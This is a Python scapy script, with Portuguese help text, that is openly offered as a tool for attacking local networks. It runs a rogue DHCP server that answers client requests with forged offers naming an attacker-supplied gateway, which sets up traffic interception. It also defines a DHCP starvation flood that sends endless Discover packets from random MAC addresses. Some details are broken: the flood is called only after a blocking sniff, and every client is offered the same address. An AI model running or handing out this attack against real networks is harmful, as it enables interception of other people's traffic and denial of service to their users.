import argparse
from scapy.all import *

def malicious_dhcp_server(iface, server_ip, start_ip, end_ip, subnet_mask, router):
    def dhcp_server(pkt):
        if pkt[DHCP].options[0][1] == 1:  # DHCP Discover
            print(f"Received DHCP Discover from {pkt[Ether].src}")
            dhcp_offer = Ether(src=get_if_hwaddr(iface), dst="ff:ff:ff:ff:ff:ff") / \
                         IP(src=server_ip, dst="255.255.255.255") / \
                         UDP(sport=67, dport=68) / \
                         BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                         DHCP(options=[("message-type", "offer"), ("subnet_mask", subnet_mask), ("router", router), ("end")])
            sendp(dhcp_offer, iface=iface, verbose=0)

        elif pkt[DHCP].options[0][1] == 3:  # DHCP Request
            print(f"Received DHCP Request from {pkt[Ether].src}")
            dhcp_ack = Ether(src=get_if_hwaddr(iface), dst="ff:ff:ff:ff:ff:ff") / \
                       IP(src=server_ip, dst="255.255.255.255") / \
                       UDP(sport=67, dport=68) / \
                       BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
                       DHCP(options=[("message-type", "ack"), ("subnet_mask", subnet_mask), ("router", router), ("end")])
            sendp(dhcp_ack, iface=iface, verbose=0)

    def dhcp_starvation(iface):
        conf.checkIPaddr = False 

        DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
                    / IP(src='0.0.0.0', dst='255.255.255.255') \
                    / UDP(dport=67, sport=68) \
                    / BOOTP(op=1, chaddr=RandMAC()) \
                    / DHCP(options=[('message-type', 'discover'), ('end')])


        sendp(DHCP_DISCOVER, iface=iface, loop=1, verbose=1)

    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=iface)

    # Start DHCP starvation
    dhcp_starvation(iface)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script para executar um servidor DHCP malicioso e sobrecarregar o range de IPs.')
    parser.add_argument('-i', '--interface', type=str, required=True, help='Interface de rede a ser usada para o ataque')
    parser.add_argument('-s', '--server_ip', type=str, required=True, help='Endereço IP do servidor DHCP malicioso')
    parser.add_argument('-si', '--start_ip', type=str, required=True, help='Primeiro IP a ser oferecido')
    parser.add_argument('-ei', '--end_ip', type=str, required=True, help='Último IP a ser oferecido')
    parser.add_argument('-sm', '--subnet_mask', type=str, required=True, help='Máscara de sub-rede')
    parser.add_argument('-r', '--router', type=str, required=True, help='Gateway padrão')

    args = parser.parse_args()
    
    malicious_dhcp_server(args.interface, args.server_ip, args.start_ip, args.end_ip, args.subnet_mask, args.router)
